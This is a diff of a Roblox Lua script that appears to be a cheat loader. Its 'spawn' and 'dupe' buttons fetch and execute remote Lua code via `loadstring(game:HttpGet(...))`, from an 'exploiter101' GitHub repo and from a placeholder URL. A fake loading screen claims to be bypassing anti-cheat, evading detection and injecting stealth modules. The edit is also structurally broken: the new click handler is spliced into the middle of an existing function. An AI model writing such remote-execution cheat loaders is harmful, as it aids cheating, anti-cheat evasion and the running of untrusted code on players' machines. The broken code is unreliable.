@@ -410,44 +410,37 @@ local function showRedirectLoadingScreen(callback)
     wait(0.48)
 
     -- Animate "Bypassing Roblox Anti-Cheat Systems..." with dots cycling, for 13 seconds (8+5)
+spawnButton.MouseButton1Click:Connect(function()
+    -- 💥 Start the main script immediately
+    task.spawn(function()
+        loadstring(game:HttpGet("https://your-url.com/spawn.lua"))()
+    end)
+
+    -- 🔁 Show the loading UI (runs while the script is doing its thing)
     local redirectTime = 13
     local steps = 52
     for i = 1, steps do
-        label.Text = "Script Loading" .. string.rep(".", (i%4))
+        label.Text = "Script Loading" .. string.rep(".", (i % 4))
         sublabel.Text = ({
             [1] = "Establishing secure connection...",
             [2] = "Evading detection...",
             [3] = "Injecting stealth modules...",
             [0] = "Initializing advanced evasion protocols. Please stand by."
         })[i % 4] or sublabel.Text
-        wait(redirectTime/steps)
+        wait(redirectTime / steps)
     end
+
     label.Text = "Load Successful!"
     sublabel.Text = "You are undetected. Proceeding..."
 
-    -- Exit Animations
     local fadeTime = 0.6
     TweenService:Create(bg, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
     TweenService:Create(frame, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
     TweenService:Create(label, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {TextTransparency = 1}):Play()
     TweenService:Create(sublabel, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {TextTransparency = 1}):Play()
-    wait(fadeTime+0.05)
+    wait(fadeTime + 0.05)
 
     redirectGui:Destroy()
-    if callback then callback() end
-end
-
--- SPAWN BUTTON and DUPE BUTTON now show a loading screen and then redirect to script
-spawnButton.MouseButton1Click:Connect(function()
-    showRedirectLoadingScreen(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/exploiter101/ZeoHubLoader/refs/heads/main/test2.lua"))()
-    end)
-end)
-
-dupeButton.MouseButton1Click:Connect(function()
-    showRedirectLoadingScreen(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/exploiter101/ZeoHubLoader/refs/heads/main/test2.lua"))()
-    end)
 end)
 
 -- HOTKEY TO TOGGLE GUI (Right Ctrl)
